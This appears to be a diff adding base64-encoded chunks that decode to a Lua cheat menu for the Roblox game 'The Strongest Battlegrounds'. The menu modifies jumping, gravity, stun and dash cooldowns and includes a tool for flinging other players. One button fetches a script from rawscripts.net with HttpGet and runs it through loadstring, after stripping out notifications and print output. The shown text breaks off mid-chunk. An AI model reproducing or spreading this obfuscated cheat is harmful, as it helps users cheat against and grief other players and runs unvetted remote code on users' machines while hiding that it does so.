+.."IiwgQ3VycmVudFZhbHVlPWZhbHNlLCBGbGFnPSJKdW1wQm9vc3QiLAogICAgQ2FsbGJhY2s9ZnVuY3Rpb24odikKICAgICAgICBp
+.."ZiBodW1hbm9pZCB0aGVuIGh1bWFub2lkLlVzZUp1bXBQb3dlciA9IG5vdCB2IGVuZAogICAgZW5kLAp9KQotLSBKdW1wIEhlaWdo
+.."dDogdHlwZSB2YWx1ZSA3LjLigJM1MDAKbWFpblRhYjpDcmVhdGVJbnB1dCh7CiAgICBOYW1lPSJKdW1wIEhlaWdodCAgKDcuMiDi
+.."gJMgNTAwKSIsCiAgICBQbGFjZWhvbGRlclRleHQ9IkRlZmF1bHQ6IDcuMiIsCiAgICBGbGFnPSJKdW1wSW5wdXQiLAogICAgUmVt
+.."b3ZlVGV4dEFmdGVyRm9jdXNMb3N0PWZhbHNlLAogICAgQ2FsbGJhY2s9ZnVuY3Rpb24odikKICAgICAgICBsb2NhbCBuID0gdG9u
+.."dW1iZXIodikKICAgICAgICBpZiBuIGFuZCBodW1hbm9pZCB0aGVuIGh1bWFub2lkLkp1bXBIZWlnaHQgPSBtYXRoLmNsYW1wKG4s
+.."IDAsIDUwMCkgZW5kCiAgICBlbmQsCn0pCgptYWluVGFiOkNyZWF0ZURpdmlkZXIoKQoKLS0gR3Jhdml0eTogdHlwZSB2YWx1ZSAw
+.."4oCTMzAwICAoZGVmYXVsdCAxOTIuNiA9IG5vcm1hbCkKbWFpblRhYjpDcmVhdGVJbnB1dCh7CiAgICBOYW1lPSJHcmF2aXR5ICAo
+.."MCDigJMgMzAwLCBkZWZhdWx0IDE5Mi42KSIsCiAgICBQbGFjZWhvbGRlclRleHQ9IkRlZmF1bHQ6IDE5Mi42IiwKICAgIEZsYWc9
+.."IkdyYXZpdHlJbnB1dCIsCiAgICBSZW1vdmVUZXh0QWZ0ZXJGb2N1c0xvc3Q9ZmFsc2UsCiAgICBDYWxsYmFjaz1mdW5jdGlvbih2
+.."KQogICAgICAgIGxvY2FsIG4gPSB0b251bWJlcih2KQogICAgICAgIGlmIG4gdGhlbiB3b3Jrc3BhY2UuR3Jhdml0eSA9IG1hdGgu
+.."Y2xhbXAobiwgMCwgMzAwKSBlbmQKICAgIGVuZCwKfSkKCi0tIEZPVjogdHlwZSB2YWx1ZSAxMOKAkzEyMCAgKGRlZmF1bHQgNzAp
+.."Cm1haW5UYWI6Q3JlYXRlSW5wdXQoewogICAgTmFtZT0iRk9WICAoMTAg4oCTIDEyMCkiLAogICAgUGxhY2Vob2xkZXJUZXh0PSJE
+.."ZWZhdWx0OiA3MCIsCiAgICBGbGFnPSJGT1ZJbnB1dCIsCiAgICBSZW1vdmVUZXh0QWZ0ZXJGb2N1c0xvc3Q9ZmFsc2UsCiAgICBD
+.."YWxsYmFjaz1mdW5jdGlvbih2KQogICAgICAgIGxvY2FsIG4gPSB0b251bWJlcih2KQogICAgICAgIGlmIG4gYW5kIHdvcmtzcGFj
+.."ZS5DdXJyZW50Q2FtZXJhIHRoZW4KICAgICAgICAgICAgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuRmllbGRPZlZpZXcgPSBtYXRo
+.."LmNsYW1wKG4sIDEwLCAxMjApCiAgICAgICAgZW5kCiAgICBlbmQsCn0pCgptYWluVGFiOkNyZWF0ZURpdmlkZXIoKQptYWluVGFi
+.."OkNyZWF0ZVNlY3Rpb24oIkV4cGxvaXRzIikKCm1haW5UYWI6Q3JlYXRlVG9nZ2xlKHsKICAgIE5hbWU9Ik5vIERhc2ggQ29vbGRv
+.."d24iLCBDdXJyZW50VmFsdWU9ZmFsc2UsIEZsYWc9Ik5vRGFzaENvb2xkb3duIiwKICAgIENhbGxiYWNrPWZ1bmN0aW9uKHYpCiAg
+.."ICAgICAgcGNhbGwoZnVuY3Rpb24oKSB3b3Jrc3BhY2U6U2V0QXR0cmlidXRlKCJOb0Rhc2hDb29sZG93biIsIHYpIGVuZCkKICAg
+.."IGVuZCwKfSkKCmxvY2FsIG5vRGFzaEVuZGxhZ0VuYWJsZWQgPSBmYWxzZQptYWluVGFiOkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1l
+.."PSJObyBEYXNoIEVuZGxhZyIsIEN1cnJlbnRWYWx1ZT1mYWxzZSwgRmxhZz0iTm9EYXNoRW5kbGFnIiwKICAgIENhbGxiYWNrPWZ1
+.."bmN0aW9uKHYpCiAgICAgICAgbm9EYXNoRW5kbGFnRW5hYmxlZCA9IHYKICAgIGVuZCwKfSkKCi0tIE5vIERhc2ggRW5kbGFnIGxv
+.."Z2ljOiBvbiBRIHByZXNzLCBzdG9wIGxvbmcgYW5pbWF0aW9uIHRyYWNrcyBhZnRlciB+MC4zcwpVc2VySW5wdXRTZXJ2aWNlLklu
+.."cHV0QmVnYW46Q29ubmVjdChmdW5jdGlvbihpbnAsIGdwKQogICAgaWYgZ3Agb3Igbm90IG5vRGFzaEVuZGxhZ0VuYWJsZWQgdGhl
+.."biByZXR1cm4gZW5kCiAgICBpZiBpbnAuS2V5Q29kZSA9PSBFbnVtLktleUNvZGUuUSB0aGVuCiAgICAgICAgdGFzay5kZWxheSgw
+.."LjMsIGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgbm90IG5vRGFzaEVuZGxhZ0VuYWJsZWQgdGhlbiByZXR1cm4gZW5kCiAgICAg
+.."ICAgICAgIGxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgaWYgbm90IGNoYXIgdGhlbiByZXR1
+.."cm4gZW5kCiAgICAgICAgICAgIGxvY2FsIGh1bSA9IGNoYXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAg
+.."ICAgICAgIGlmIG5vdCBodW0gdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAg
+.."ICAgIGZvciBfLCB0cmFjayBpbiBpcGFpcnMoaHVtOkdldFBsYXlpbmdBbmltYXRpb25UcmFja3MoKSkgZG8KICAgICAgICAgICAg
+.."ICAgICAgICBpZiB0cmFjay5MZW5ndGggYW5kIHRyYWNrLkxlbmd0aCA+IDAuNDUgdGhlbgogICAgICAgICAgICAgICAgICAgICAg
+.."ICB0cmFjazpTdG9wKDAuMDgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAg
+.."ZW5kKQogICAgICAgIGVuZCkKICAgIGVuZAplbmQpCgptYWluVGFiOkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1lPSJObyBGYXRpZ3Vl
+.."IiwgQ3VycmVudFZhbHVlPWZhbHNlLCBGbGFnPSJOb0ZhdGlndWUiLAogICAgQ2FsbGJhY2s9ZnVuY3Rpb24odikKICAgICAgICBw
+.."Y2FsbChmdW5jdGlvbigpIHdvcmtzcGFjZTpTZXRBdHRyaWJ1dGUoIk5vRmF0aWd1ZSIsIHYpIGVuZCkKICAgIGVuZCwKfSkKbWFp
+.."blRhYjpDcmVhdGVMYWJlbCgi4pqgIE5vIEZhdGlndWU6IFVwZGF0ZSBuZWVkZWQuIikKCm1haW5UYWI6Q3JlYXRlRGl2aWRlcigp
+.."Cm1haW5UYWI6Q3JlYXRlU2VjdGlvbigiRW1vdGVzIikKCm1haW5UYWI6Q3JlYXRlVG9nZ2xlKHsKICAgIE5hbWU9IkV4dHJhIEVt
+.."b3RlIFNsb3RzIiwgQ3VycmVudFZhbHVlPWZhbHNlLCBGbGFnPSJFbW90ZUV4dHJhU2xvdHMiLAogICAgQ2FsbGJhY2s9ZnVuY3Rp
+.."b24odikKICAgICAgICBwY2FsbChmdW5jdGlvbigpIExvY2FsUGxheWVyOlNldEF0dHJpYnV0ZSgiRXh0cmFTbG90cyIsIHYpIGVu
+.."ZCkKICAgIGVuZCwKfSkKbWFpblRhYjpDcmVhdGVUb2dnbGUoewogICAgTmFtZT0iRW1vdGUgU2VhcmNoIEJhciIsIEN1cnJlbnRW
+.."YWx1ZT1mYWxzZSwgRmxhZz0iRW1vdGVTZWFyY2hCYXIiLAogICAgQ2FsbGJhY2s9ZnVuY3Rpb24odikKICAgICAgICBwY2FsbChm
+.."dW5jdGlvbigpIExvY2FsUGxheWVyOlNldEF0dHJpYnV0ZSgiRW1vdGVTZWFyY2hCYXIiLCB2KSBlbmQpCiAgICBlbmQsCn0pCgpt
+.."YWluVGFiOkNyZWF0ZURpdmlkZXIoKQptYWluVGFiOkNyZWF0ZVNlY3Rpb24oIkNvbWJhdCIpCgotLSBObyBTdHVuOiByZWFjdGl2
+.."ZSB2aWEgR2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsIOKAlCBmaXJlcyB0aGUgaW5zdGFudCBUU0IgY2hhbmdlcyB0aGUgdmFsdWUK
+.."bG9jYWwgbm9TdHVuRW5hYmxlZCAgPSBmYWxzZQpsb2NhbCBub1N0dW5TcGQgICAgICA9IDE2CmxvY2FsIG5vU3R1bkNvbm5zICAg
+.."ID0ge30KbG9jYWwgbm9TdHVuQ2hhckNvbm4gPSBuaWwKCmxvY2FsIGZ1bmN0aW9uIGRpc2Nvbm5lY3ROb1N0dW4oKQogICAgZm9y
+.."IGkgPSAxLCAjbm9TdHVuQ29ubnMgZG8KICAgICAgICBub1N0dW5Db25uc1tpXTpEaXNjb25uZWN0KCkKICAgIGVuZAogICAgbm9T
+.."dHVuQ29ubnMgPSB7fQplbmQKCmxvY2FsIGZ1bmN0aW9uIGFwcGx5Tm9TdHVuKGNoYXIpCiAgICBkaXNjb25uZWN0Tm9TdHVuKCkK
+.."ICAgIGlmIG5vdCBub1N0dW5FbmFibGVkIG9yIG5vdCBjaGFyIHRoZW4gcmV0dXJuIGVuZAogICAgbG9jYWwgaHVtID0gY2hhcjpG
+.."aW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgIGxvY2FsIGhycCA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFu
+.."b2lkUm9vdFBhcnQiKQogICAgaWYgbm90IGh1bSB0aGVuIHJldHVybiBlbmQKCiAgICAtLSBTZXQgdmFsdWVzIGltbWVkaWF0ZWx5
+.."IG9uIGNvbm5lY3QKICAgIHBjYWxsKGZ1bmN0aW9uKCkgaHVtLldhbGtTcGVlZCAgICAgPSBub1N0dW5TcGQgZW5kKQogICAgcGNh
+.."bGwoZnVuY3Rpb24oKSBodW0uUGxhdGZvcm1TdGFuZCA9IGZhbHNlICAgICAgZW5kKQoKICAgIC0tIFdhbGtTcGVlZDogdGhlIG1v
+.."bWVudCBUU0IgY2hhbmdlcyBpdCDihpIgaW5zdGFudGx5IHJlc3RvcmUKICAgIG5vU3R1bkNvbm5zWyNub1N0dW5Db25ucyArIDFd
+.."ID0gaHVtOkdldFByb3BlcnR5Q2hhbmdlZFNpZ25hbCgiV2Fsa1NwZWVkIik6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgcGNh
+.."bGwoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBodW0uV2Fsa1NwZWVkIH49IG5vU3R1blNwZCB0aGVuCiAgICAgICAgICAgICAg
+.."ICBodW0uV2Fsa1NwZWVkID0gbm9TdHVuU3BkCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZCkKCiAgICAtLSBQ
+.."bGF0Zm9ybVN0YW5kOiB0aGUgbW9tZW50IFRTQiBzZXRzIGl0IHRydWUg4oaSIGluc3RhbnRseSBmYWxzZQogICAgbm9TdHVuQ29u
+.."bnNbI25vU3R1bkNvbm5zICsgMV0gPSBodW06R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCJQbGF0Zm9ybVN0YW5kIik6Q29ubmVj
+.."dChmdW5jdGlvbigpCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBodW0uUGxhdGZvcm1TdGFuZCB0aGVu
+.."IGh1bS5QbGF0Zm9ybVN0YW5kID0gZmFsc2UgZW5kCiAgICAgICAgZW5kKQogICAgZW5kKQoKICAgIC0tIEh1bWFub2lkUm9vdFBh
+.."cnQgdmVsb2NpdHk6IHRoZSBtb21lbnQgYSBsYXJnZSBrbm9ja2JhY2sgaXMgYXBwbGllZCDihpIgemVybyBob3Jpem9udGFsCiAg
+.."ICBpZiBocnAgdGhlbgogICAgICAgIG5vU3R1bkNvbm5zWyNub1N0dW5Db25ucyArIDFdID0gaHJwOkdldFByb3BlcnR5Q2hhbmdl
+.."ZFNpZ25hbCgiQXNzZW1ibHlMaW5lYXJWZWxvY2l0eSIpOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBwY2FsbChmdW5j
+.."dGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCB2ZWwgID0gaHJwLkFzc2VtYmx5TGluZWFyVmVsb2NpdHkKICAgICAgICAgICAg
+.."ICAgIGxvY2FsIGhNYWcgPSBWZWN0b3IzLm5ldyh2ZWwuWCwgMCwgdmVsLlopLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgaWYg
+.."aE1hZyA+IDI1IHRoZW4KICAgICAgICAgICAgICAgICAgICBocnAuQXNzZW1ibHlMaW5lYXJWZWxvY2l0eSA9IFZlY3RvcjMubmV3
+.."KDAsIHZlbC5ZLCAwKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQpCiAgICBlbmQKZW5k
+.."CgptYWluVGFiOkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1lPSJObyBTdHVuIiwgQ3VycmVudFZhbHVlPWZhbHNlLCBGbGFnPSJOb1N0
+.."dW4iLAogICAgQ2FsbGJhY2s9ZnVuY3Rpb24odikKICAgICAgICBub1N0dW5FbmFibGVkID0gdgogICAgICAgIGlmIHYgdGhlbgog
+.."ICAgICAgICAgICBsb2NhbCBjaGFyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGxvY2FsIGh1bSAgPSBjaGFy
+.."IGFuZCBjaGFyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgICAgICBub1N0dW5TcGQgPSAoaHVtIGFu
+.."ZCBodW0uV2Fsa1NwZWVkID4gMikgYW5kIGh1bS5XYWxrU3BlZWQgb3IgMTYKICAgICAgICAgICAgYXBwbHlOb1N0dW4oY2hhcikK
+.."ICAgICAgICAgICAgbm9TdHVuQ2hhckNvbm4gPSBMb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKG5l
+.."d0NoYXIpCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgbm9TdHVuU3BkID0gMTYKICAgICAg
+.."ICAgICAgICAgIGFwcGx5Tm9TdHVuKG5ld0NoYXIpCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbHNlCiAgICAgICAgICAgIGRp
+.."c2Nvbm5lY3ROb1N0dW4oKQogICAgICAgICAgICBpZiBub1N0dW5DaGFyQ29ubiB0aGVuIG5vU3R1bkNoYXJDb25uOkRpc2Nvbm5l
+.."Y3QoKTsgbm9TdHVuQ2hhckNvbm4gPSBuaWwgZW5kCiAgICAgICAgZW5kCiAgICBlbmQsCn0pCm1haW5UYWI6Q3JlYXRlTGFiZWwo
+.."IuKaoCBCZXRhOiBTZXQgc3BlZWQgYm9vc3QgZm9yIGJldHRlciB3b3JrLiIpCgptYWluVGFiOkNyZWF0ZURpdmlkZXIoKQptYWlu
+.."VGFiOkNyZWF0ZVNlY3Rpb24oIldhbGwgQ29tYm8iKQptYWluVGFiOkNyZWF0ZUxhYmVsKCJQcmVzcyBidXR0b24gdG8gbG9hZCBX
+.."YWxsIENvbWJvIHNjcmlwdCAoYXV0by1kZXRlY3Qgd2FsbHMsIGF1dG8tY29tYm8pLiIpCgpsb2NhbCB3YWxsQ29tYm9Mb2FkZWQg
+.."PSBmYWxzZQptYWluVGFiOkNyZWF0ZUJ1dHRvbih7CiAgICBOYW1lID0gIkxvYWQgV2FsbCBDb21ibyIsCiAgICBDYWxsYmFjayA9
+.."IGZ1bmN0aW9uKCkKICAgICAgICBpZiB3YWxsQ29tYm9Mb2FkZWQgdGhlbgogICAgICAgICAgICBSYXlmaWVsZDpOb3RpZnkoeyBU
+.."aXRsZT0iV2FsbCBDb21ibyIsIENvbnRlbnQ9IkFscmVhZHkgbG9hZGVkISIsIER1cmF0aW9uPTIsIEltYWdlPTQ0ODMzNjI0NTgg
+.."fSkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCiAgICAgICAgd2FsbENvbWJvTG9hZGVkID0gdHJ1ZQogICAgICAgIHRh
+.."c2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCBzcmMg
+.."PSBnYW1lOkh0dHBHZXQoCiAgICAgICAgICAgICAgICAgICAgImh0dHBzOi8vcmF3c2NyaXB0cy5uZXQvcmF3L1RoZS1TdHJvbmdl
+.."c3QtQmF0dGxlZ3JvdW5kcy1LRVlMRVNTLVRTQi1XYWxsLUNvbWJvLUFueXdoZXJlLWFuZC1BdXRvLVdhbGwtQ29tYm8tOTgzMTci
+.."CiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAtLSBTaWxlbmNlIGFsbCBTdGFydGVyR3VpIFNldENvcmUgbm90aWZp
+.."Y2F0aW9ucwogICAgICAgICAgICAgICAgc3JjID0gc3JjOmdzdWIoCiAgICAgICAgICAgICAgICAgICAgJ2dhbWU6R2V0U2Vydmlj
+.."ZSUoIlN0YXJ0ZXJHdWkiJSknLAogICAgICAgICAgICAgICAgICAgICdzZXRtZXRhdGFibGUoe30se19faW5kZXg9ZnVuY3Rpb24o
+.."KXJldHVybiBmdW5jdGlvbigpZW5kIGVuZH0pJwogICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgc3JjID0gc3JjOmdz
+.."dWIoJ1N0YXJ0ZXJHdWk6U2V0Q29yZSViKCknLCAnJykKICAgICAgICAgICAgICAgIC0tIFNpbGVuY2UgcHJpbnRzCiAgICAgICAg
+.."ICAgICAgICBzcmMgPSBzcmM6Z3N1YigncHJpbnQlYigpJywgJycpCiAgICAgICAgICAgICAgICBsb2Fkc3RyaW5nKHNyYykoKQog
+.."ICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kKQogICAgZW5kLAp9KQoKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQotLSDilZDilZDilZAgVEFCOiBGTElORyDilZDi
+.."lZDilZAKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLQpsb2NhbCBmbGluZ1RhYiA9IFdpbmRvdzpDcmVhdGVUYWIoIvCfkqUgRmxpbmciLCAiemFwIikKCmZsaW5nVGFi
+.."OkNyZWF0ZVNlY3Rpb24oIk11bHRpLVRhcmdldCBGbGluZyIpCgpmbGluZ1RhYjpDcmVhdGVCdXR0b24oewogICAgTmFtZSA9ICLi
+.."mpQgT3BlbiBGbGluZyBHVUkiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgaWYgRmxpbmdHdWkgYW5kIEZsaW5n
+.."R3VpLlBhcmVudCB0aGVuCiAgICAgICAgICAgIEZsaW5nR3VpOkRlc3Ryb3koKQogICAgICAgICAgICBGbGluZ0d1aSA9IG5pbAog
+.."ICAgICAgIGVsc2UKICAgICAgICAgICAgQ3JlYXRlRmxpbmdHVUkoKQogICAgICAgICAgICBSYXlmaWVsZDpOb3RpZnkoewogICAg
+.."ICAgICAgICAgICAgVGl0bGUgICA9ICJGbGluZyBHVUkiLAogICAgICAgICAgICAgICAgQ29udGVudCA9ICJXaW5kb3cgb3BlbmVk
+.."ISBTZWxlY3QgdGFyZ2V0cy4iLAogICAgICAgICAgICAgICAgRHVyYXRpb24gPSAyLAogICAgICAgICAgICAgICAgSW1hZ2UgICA9
+.."IDQ0ODMzNjI0NTgsCiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kCiAgICBlbmQsCn0pCgpmbGluZ1RhYjpDcmVhdGVEaXZpZGVy
+.."KCkKZmxpbmdUYWI6Q3JlYXRlU2VjdGlvbigiQW50aS1GbGluZyIpCgpsb2NhbCBBbnRpRmxpbmdBY3RpdmUgPSBmYWxzZQpsb2Nh
+.."bCBBbnRpRmxpbmdDb25uICAgPSBuaWwKCmxvY2FsIGZ1bmN0aW9uIGFwcGx5QW50aUZsaW5nKCkKICAgIGlmIGh1bWFub2lkIHRo
+.."ZW4KICAgICAgICBwY2FsbChmdW5jdGlvbigpIGh1bWFub2lkOlNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBl
+.."LlNlYXRlZCwgZmFsc2UpIGVuZCkKICAgIGVuZAogICAgQW50aUZsaW5nQ29ubiA9IFJ1blNlcnZpY2UuSGVhcnRiZWF0OkNvbm5l
+.."Y3QoZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBpZiBub3QgY2hh
+.."ciB0aGVuIHJldHVybiBlbmQKICAgICAgICBmb3IgXywgcGFydCBpbiBpcGFpcnMod29ya3NwYWNlOkdldERlc2NlbmRhbnRzKCkp
+.."IGRvCiAgICAgICAgICAgIGlmIHBhcnQ6SXNBKCJCYXNlUGFydCIpIGFuZCBub3QgcGFydC5BbmNob3JlZCBhbmQgbm90IHBhcnQ6
+.."SXNEZXNjZW5kYW50T2YoY2hhcikgdGhlbgogICAgICAgICAgICAgICAgaWYgcGFydC5Bc3NlbWJseUxpbmVhclZlbG9jaXR5Lk1h
+.."Z25pdHVkZSA+IDMKICAgICAgICAgICAgICAgIG9yIHBhcnQuQXNzZW1ibHlBbmd1bGFyVmVsb2NpdHkuTWFnbml0dWRlID4gMyB0
+.."aGVuCiAgICAgICAgICAgICAgICAgICAgcGFydC5DYW5Db2xsaWRlID0gZmFsc2UKICAgICAgICAgICAgICAgIGVuZAogICAgICAg
+.."ICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKZW5kCgpsb2NhbCBmdW5jdGlvbiByZW1vdmVBbnRpRmxpbmcoKQogICAgaWYg
+.."QW50aUZsaW5nQ29ubiB0aGVuIEFudGlGbGluZ0Nvbm46RGlzY29ubmVjdCgpOyBBbnRpRmxpbmdDb25uID0gbmlsIGVuZAogICAg
+.."aWYgaHVtYW5vaWQgdGhlbgogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgaHVtYW5vaWQ6U2V0U3RhdGVFbmFibGVkKEVudW0uSHVt
+.."YW5vaWRTdGF0ZVR5cGUuU2VhdGVkLCB0cnVlKSBlbmQpCiAgICBlbmQKZW5kCgpmbGluZ1RhYjpDcmVhdGVUb2dnbGUoewogICAg
+.."TmFtZSA9ICJBbnRpLUZsaW5nIiwKICAgIEN1cnJlbnRWYWx1ZSA9IGZhbHNlLAogICAgRmxhZyA9ICJBbnRpRmxpbmciLAogICAg
+.."Q2FsbGJhY2sgPSBmdW5jdGlvbih2KQogICAgICAgIEFudGlGbGluZ0FjdGl2ZSA9IHYKICAgICAgICBpZiB2IHRoZW4KICAgICAg
+.."ICAgICAgYXBwbHlBbnRpRmxpbmcoKQogICAgICAgIGVsc2UKICAgICAgICAgICAgcmVtb3ZlQW50aUZsaW5nKCkKICAgICAgICBl
+.."bmQKICAgIGVuZCwKfSkKCi0tIFJlLWFwcGx5IG9uIHJlc3Bhd24KTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChm
+.."dW5jdGlvbigpCiAgICBpZiBBbnRpRmxpbmdBY3RpdmUgdGhlbgogICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgIGFwcGx5QW50
+.."aUZsaW5nKCkKICAgIGVuZAplbmQpCgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi0tIOKVkOKVkOKVkCBUQUI6IE1PVkVTRVRTIOKVkOKVkOKVkAotLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmxvY2Fs
+.."IG1vdmVzZXRUYWIgPSBXaW5kb3c6Q3JlYXRlVGFiKCLwn6WKIE1vdmVzZXRzIiwgImFjdGl2aXR5IikKCm1vdmVzZXRUYWI6Q3Jl
+.."YXRlU2VjdGlvbigiSnVqdXRzdSBLYWlzZW4iKQoKLS0g4pSA4pSAIEdPSk8gU0FUT1JVIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
+.."gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
+.."gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
+.."gOKUgOKUgOKUgOKUgApsb2NhbCBmdW5jdGlvbiBydW5Hb2pvTW92ZXNldCgpCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAg
+.."ICAgICBsb2NhbCBwbHIgID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgcmVwZWF0IHRhc2sud2FpdCgpIHVudGls
+.."IHBsci5DaGFyYWN0ZXIKICAgICAgICBsb2NhbCBjaGFyID0gcGxyLkNoYXJhY3RlciBvciBwbHIuQ2hhcmFjdGVyQWRkZWQ6V2Fp
+.."dCgpCiAgICAgICAgbG9jYWwgaHVtICA9IGNoYXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIpCiAgICAgICAgbG9jYWwgcEd1aSA9
+.."IHBsci5QbGF5ZXJHdWkKCiAgICAgICAgLS0gSG90YmFyIGxhYmVscwogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAg
+.."ICAgbG9jYWwgaG90YmFyID0gcEd1aTpGaW5kRmlyc3RDaGlsZCgiSG90YmFyIikKICAgICAgICAgICAgbG9jYWwgYnAgICAgID0g
+.."aG90YmFyIGFuZCBob3RiYXI6RmluZEZpcnN0Q2hpbGQoIkJhY2twYWNrIikKICAgICAgICAgICAgbG9jYWwgaGYgICAgID0gYnAg
+.."YW5kIGJwOkZpbmRGaXJzdENoaWxkKCJIb3RiYXIiKQogICAgICAgICAgICBpZiBoZiB0aGVuCiAgICAgICAgICAgICAgICBsb2Nh
+.."bCBuYW1lcyA9IHsiUmV2ZXJzYWwgUmVkIiwiQmFycmFnZSBBdHRhY2siLCJTdHJvbmcgUHVuY2giLCJKdXN0aWNlIHRocm93In0K
+.."ICAgICAgICAgICAgICAgIGZvciBpLCBuIGluIGlwYWlycyhuYW1lcykgZG8KICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5j
+.."dGlvbigpIGhmOkZpbmRGaXJzdENoaWxkKHRvc3RyaW5nKGkpKS5CYXNlLlRvb2xOYW1lLlRleHQgPSBuIGVuZCkKICAgICAgICAg
+.."ICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCgogICAgICAgIC0tIE1hZ2ljSGVhbHRoIGxhYmVsCiAgICAg
+.."ICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBzZyA9IHBHdWk6RmluZEZpcnN0Q2hpbGQoIlNjcmVlbkd1aSIp
+.."CiAgICAgICAgICAgIGxvY2FsIG1oID0gc2cgYW5kIHNnOkZpbmRGaXJzdENoaWxkKCJNYWdpY0hlYWx0aCIpCiAgICAgICAgICAg
+.."IGxvY2FsIHRsID0gbWggYW5kIG1oOkZpbmRGaXJzdENoaWxkKCJUZXh0TGFiZWwiKQogICAgICAgICAgICBpZiB0bCB0aGVuIHRs
+.."LlRleHQgPSAiTGV0J3MgR2V0IENyYXp5IiBlbmQKICAgICAgICBlbmQpCiAgICAgICAgcEd1aS5EZXNjZW5kYW50QWRkZWQ6Q29u
+.."bmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGxvY2FsIHNnID0gcEd1
+.."aTpGaW5kRmlyc3RDaGlsZCgiU2NyZWVuR3VpIikKICAgICAgICAgICAgICAgIGxvY2FsIG1oID0gc2cgYW5kIHNnOkZpbmRGaXJz
+.."dENoaWxkKCJNYWdpY0hlYWx0aCIpCiAgICAgICAgICAgICAgICBsb2NhbCB0bCA9IG1oIGFuZCBtaDpGaW5kRmlyc3RDaGlsZCgi
+.."VGV4dExhYmVsIikKICAgICAgICAgICAgICAgIGlmIHRsIHRoZW4gdGwuVGV4dCA9ICJMZXQncyBHZXQgQ3JhenkiIGVuZAogICAg
+.."ICAgICAgICBlbmQpCiAgICAgICAgZW5kKQoKICAgICAgICAtLSBBbmltYXRpb24gcmVwbGFjZW1lbnRzICh0cmlnZ2VyIGFuaW0g
